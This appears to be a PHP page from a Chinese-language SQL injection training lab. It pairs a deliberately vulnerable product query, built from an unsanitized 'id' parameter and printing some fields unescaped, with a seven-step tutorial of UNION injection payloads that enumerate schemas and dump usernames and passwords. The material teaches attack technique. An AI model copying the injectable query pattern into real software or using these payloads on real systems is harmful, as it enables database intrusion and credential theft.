<?php
header("Content-Type: text/html; charset=utf-8");
$mysqli = new mysqli("db", "sqli", "sqli123", "sqli_lab");
$mysqli->set_charset("utf8mb4");

if ($mysqli->connect_error) {
    die("連線失敗: " . $mysqli->connect_error);
}

$id = $_GET['id'] ?? '';

echo "<h2>🔗 UNION-based SQL Injection 測試</h2>";

if ($id !== '') {
    $query = "SELECT id, name, description FROM products WHERE id = '$id'";
    echo "<p><strong>執行的 SQL：</strong><code>" . htmlspecialchars($query) . "</code></p>";

    $result = $mysqli->query($query);

    if ($result) {
        if ($result->num_rows > 0) {
            echo "<table border='1' cellpadding='6' cellspacing='0'>";
            echo "<tr><th>ID</th><th>名稱</th><th>描述</th></tr>";
            while ($row = $result->fetch_assoc()) {
                echo "<tr>";
                echo "<td>" . htmlspecialchars((string)$row['id']) . "</td>";
                echo "<td>" . $row['name'] . "</td>";
                echo "<td>" . $row['description'] . "</td>";
                echo "</tr>";
            }
            echo "</table>";
        } else {
            echo "<p style='color:orange;'>⚠️ 查無資料（但 SQL 語法正確）</p>";
        }
    } else {
        echo "<p style='color:red;'>❌ SQL 錯誤：{$mysqli->error}</p>";
    }
} else {
    echo "<p style='color:gray;'>請在網址加上 <code>?id=1</code> 開始測試。</p>";
}
?>

<hr>
<h3>💡 UNION-based SQL Injection 攻擊步驟教學：</h3>

<h4>Step 1 — 測試欄位數（ORDER BY）</h4>
<ul>
  <li><code>?id=1 ORDER BY 1--+</code> ← 正常</li>
  <li><code>?id=1 ORDER BY 2--+</code> ← 正常</li>
  <li><code>?id=1 ORDER BY 3--+</code> ← 正常</li>
  <li><code>?id=1 ORDER BY 4--+</code> ← 報錯 → 確認有 <strong>3 個欄位</strong></li>
</ul>

<h4>Step 2 — 找出可顯示的欄位位置</h4>
<ul>
  <li><code>?id=0 UNION SELECT NULL,NULL,NULL--+</code> ← 先確認語法正確</li>
  <li><code>?id=0 UNION SELECT 1,2,3--+</code> ← 看哪個數字出現在頁面上</li>
</ul>

<h4>Step 3 — 取得資料庫資訊</h4>
<ul>
  <li><code>?id=0 UNION SELECT 1,database(),version()--+</code> ← 目前資料庫 &amp; 版本</li>
  <li><code>?id=0 UNION SELECT 1,user(),@@hostname--+</code> ← 資料庫使用者 &amp; 主機名稱</li>
  <li><code>?id=0 UNION SELECT 1,@@datadir,@@basedir--+</code> ← 資料目錄路徑</li>
</ul>

<h4>Step 4 — 列出所有資料表</h4>
<ul>
  <li><code>?id=0 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--+</code></li>
</ul>

<h4>Step 5 — 列出指定資料表的欄位</h4>
<ul>
  <li><code>?id=0 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'--+</code></li>
</ul>

<h4>Step 6 — 傾倒資料（Data Dump）</h4>
<ul>
  <li><code>?id=0 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR ' | '),3 FROM users--+</code> ← 一次列出所有帳密</li>
  <li><code>?id=0 UNION SELECT id,username,email FROM users LIMIT 0,1--+</code> ← 逐筆讀取</li>
  <li><code>?id=0 UNION SELECT id,username,role FROM users--+</code> ← 列出使用者角色</li>
</ul>

<h4>Step 7 — 跨資料庫查詢</h4>
<ul>
  <li><code>?id=0 UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata--+</code> ← 列出所有資料庫</li>
  <li><code>?id=0 UNION SELECT 1,table_name,table_schema FROM information_schema.tables LIMIT 0,1--+</code></li>
</ul>

<p>✅ 提示：使用 <code>id=0</code>（不存在的 ID）讓原查詢回傳空結果，UNION 的結果才能被顯示出來。</p>
<p>✅ <code>--+</code> 是 URL 安全的 SQL 註解（<code>--</code> 後面接空白，<code>+</code> 在 URL 代表空格）。</p>
<p><a href="index.php">← 回到總覽</a></p>
